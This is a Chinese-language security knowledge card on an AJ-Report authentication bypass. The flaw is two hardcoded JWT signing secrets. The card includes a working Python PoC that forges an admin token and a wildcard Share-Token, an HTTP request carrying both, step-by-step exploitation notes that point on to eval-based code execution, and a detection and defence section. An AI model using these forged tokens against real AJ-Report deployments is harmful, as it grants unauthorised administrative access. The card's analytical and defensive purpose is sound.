---
id: web-java-component-aj-report-default-jwt-sharetoken-forgery
title: AJ-Report 默认 JWT 密钥与固定 Share-Token 密钥伪造：自签 admin 令牌 + reportCode=/ 绕过登录缓存
type: scenario
domain: web
path: web/java/component
technique: aj-report-default-jwt-sharetoken-forgery
aliases:
- AJ-Report 默认 JWT 密钥
- anji_plus_gaea_p@ss1234
- Share-Token 伪造
- reportCode 斜杠通配
- aj-report JWT_SECRET 硬编码
tags:
- java
- aj-report
- auth-bypass
- jwt
- sharetoken
- default-secret
- hardcoded-secret
- component
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V414
  verified_at: '2026-11-09T15:38:22+08:00'
  notes: 已对照原文全文与全部19张截图核对：GaeaProperties$Security 默认 jwtSecret=anji_plus_gaea_p@ss1234 且 setJwtSecret 无调用、JwtUtil JWT_SECRET=aj-report、JWT claims(type/uuid/tenant/username)与 Share-Token claims(shareCode/reportCode=/、exp、iat、sharePassword)与原文代码一致、登录缓存 gaea:security:login:token:admin 与 Share-Token 兜底逻辑、双 token 请求返回 40005 均与图05-10一致；未本机复跑。
---

## 一句话结论

AJ-Report 的 `GaeaProperties$Security.jwtSecret` 是硬编码默认值 `anji_plus_gaea_p@ss1234`（`setJwtSecret` 从未被调用），Share-Token 密钥又是 `JwtUtil` 里的 `static final "aj-report"`；攻击者用前者自签 `username=admin` 的 HS256 JWT、用后者自签 `reportCode="/"` 的 Share-Token，即可在 admin 无登录缓存时通过 `TokenFilter` 的双重校验，未授权访问受保护接口。

## 原理

- **鉴权流程**：`TokenFilter` 校验 `Authorization` 中的 JWT，`jwtBean.getUsername(token)` 取出 `username`，再查登录缓存 `gaea:security:login:token:<username>`（token 时效 1 小时；admin 最近未登录则缓存不存在）。
- **登录缓存缺失后的 Share-Token 兜底**：从 `Share-Token` 请求头解析 `reportCodeList`，若 `!uri.endsWith("/reportDashboard/getData") && !uri.endsWith("/reportExcel/preview") && reportCodeList.stream().noneMatch(uri::contains)` 则返回 `50014 分享链接已过期`；否则放行。
- **JWT 为什么可伪造**：`JwtUtil.createToken` 用 `JWT.create().withClaim("username", ...).withClaim("uuid", ...).withClaim("type", ...).withClaim("tenant", ...).sign(Algorithm.HMAC256(gaeaProperties.getSecurity().getJwtSecret()))` 签发。`GaeaProperties$Security` 中 `private String jwtSecret = "anji_plus_gaea_p@ss1234";`，全项目没有 `setJwtSecret` 调用点，部署侧也未覆盖，因此密钥就是默认值；HS256 为对称签名，知道密钥即可伪造任意 payload。
- **Share-Token 为什么可伪造**：`JwtUtil` 中 `private static final String JWT_SECRET = "aj-report";`，`createToken(reportCode, shareCode, password, expires)` 用 `Algorithm.HMAC256(JWT_SECRET)` 签发含 `reportCode`、`shareCode`、`sharePassword` 与 iat/exp 的 token。把 `reportCode` 设为 `/`，任何 URI 都以 `/` 开头，`uri.contains("/")` 恒真，`noneMatch` 为假，整个“分享链接已过期”条件不成立，任意路径放行。
- **组合效果**：伪造 JWT 通过身份校验；登录缓存缺失时用伪造 Share-Token 兜底。两把密钥都是默认/硬编码，攻击者不需要任何真实凭据。即使 `;swagger-ui` 路径绕过被修复（见关联卡），该绕过仍然成立。
- **为什么必须同时带 Share-Token**：原文验证时 admin 当即无登录缓存，仅 JWT 会因缓存校验失败而无法放行；`reportCode="/"` 的伪造 Share-Token 使校验在进入分享逻辑后直接通过。若 admin 近 1 小时内登录过（缓存存在），仅伪造 JWT 即可。

## 触发条件

- 目标 AJ-Report 使用这套鉴权代码且未覆盖默认密钥：JWT 密钥仍为 `anji_plus_gaea_p@ss1234`，Share-Token 密钥仍为 `aj-report`。
- 攻击者掌握 JWT/Share-Token 的 claim 结构（源码、反编译或公开情报可得）。
- 目标存在可访问的受保护接口；admin 近 1 小时内未登录（缓存缺失）时须同时携带伪造 Share-Token。
- 原文未标注受影响版本区间，需按源码默认值自检。

## 利用步骤

1. 用默认 JWT 密钥签一个 `username=admin` 的 HS256 token。
2. 用固定 Share-Token 密钥签 `reportCode="/"`、`shareCode=1`、`sharePassword=1` 的分享 token。
3. 请求受保护接口，同时带 `Authorization: <jwt>` 与 `Share-Token: <share>` 两个头。
4. 若返回业务错误而非 401/500/`50014 分享链接已过期`，说明鉴权已绕过；继续利用该接口（如 eval 表达式执行）。

## PoC

```python
import jwt

admin = jwt.encode({
    "type": 0,
    "uuid": "627750b8be86421d94facec7e4dba555",
    "tenant": "tenantCode",
    "username": "admin",
}, "anji_plus_gaea_p@ss1234", algorithm="HS256")   # GaeaProperties$Security 默认 jwtSecret

share = jwt.encode({
    "shareCode": 1,
    "reportCode": "/",          # 使 uri.contains("/") 恒真
    "exp": 4070880000,
    "iat": 1715402146,
    "sharePassword": 1,
}, "aj-report", algorithm="HS256")                  # JwtUtil 固定 JWT_SECRET
```

```http
POST /dataSetParam/verification HTTP/1.1
Host: target
Authorization: <admin>
Share-Token: <share>
Content-Type: application/json

{"sampleItem":"1","validationRules":"123"}
```

原文实测携带伪造双 token 后返回 `{"code":"40005","message":"执行js失败: No such function verification.",...}`，说明已通过鉴权到达业务。说明：按原文代码/截图整理，未在本机复跑。

## 变体与关联

- 不依赖密钥的分号路径参数绕过：[[web-java-component-aj-report-semicolon-swagger-path-param-auth-bypass]]。
- 绕过后的 ScriptEngine eval RCE sink：[[web-java-component-aj-report-scriptengine-eval-rce]]。
- 同类 JWT 硬编码/默认密钥问题：[[web-generic-jwt-example-config-hardcoded-secret]]。
- 边界：密钥已被部署侧随机化覆盖、或接口另有独立鉴权时，本绕过不成立。

## 检测与防御

- **密钥**：JWT 与 Share-Token 密钥必须由部署侧配置强随机值并定期轮换，禁止硬编码默认值；启动时自检未使用默认值。
- **代码**：`setJwtSecret` 应在启动时被配置绑定实际调用；Share-Token 密钥不要使用 `static final` 常量，改为可配置。
- **检测**：admin 账号无登录事件却出现有效 token；Share-Token 的 `reportCode="/"`、`exp` 异常超长（如 2099 年）、`sharePassword=1`；同一来源同时携带 Authorization 与 Share-Token 访问普通业务接口；`50014` 之后紧跟 200 业务响应。
- **响应**：立即轮换两套密钥使既有伪造 token 失效，审计受保护接口调用与后续 eval/命令执行痕迹。
